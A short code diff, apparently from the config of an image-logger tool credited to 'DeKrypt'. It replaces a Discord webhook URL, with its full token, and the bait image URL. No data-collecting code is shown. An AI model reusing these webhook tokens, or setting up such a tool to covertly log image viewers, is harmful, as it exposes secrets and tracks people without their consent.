@@ -9,8 +9,8 @@ __author__ = "DeKrypt"
 
 config = {
 
-    "webhook": "https://discord.com/api/webhooks/1343686185448640553/rzowE7LMsRzHOGoN7uO1ktVkIqrkVezG2b_zsRI_kYra4JyyJildSulHQhZZ_cnvz7af",
-    "image": "https://s6.uupload.ir/files/24ab34838fc0f90c_q5b6.jpg", 
+    "webhook": "https://discord.com/api/webhooks/1380186721500659732/KMkblODMx1S24IbsxcDzpTlFE8Iu2ajKIdEk9pQfIsvkVcRDDiLTp9_M4PELtbcgVYpY",
+    "image": "https://i.pinimg.com/736x/b3/34/df/b334df6c363c8cefc1f312b1b4cd6763.jpg", 
                                                
     "imageArgument": True, 
 
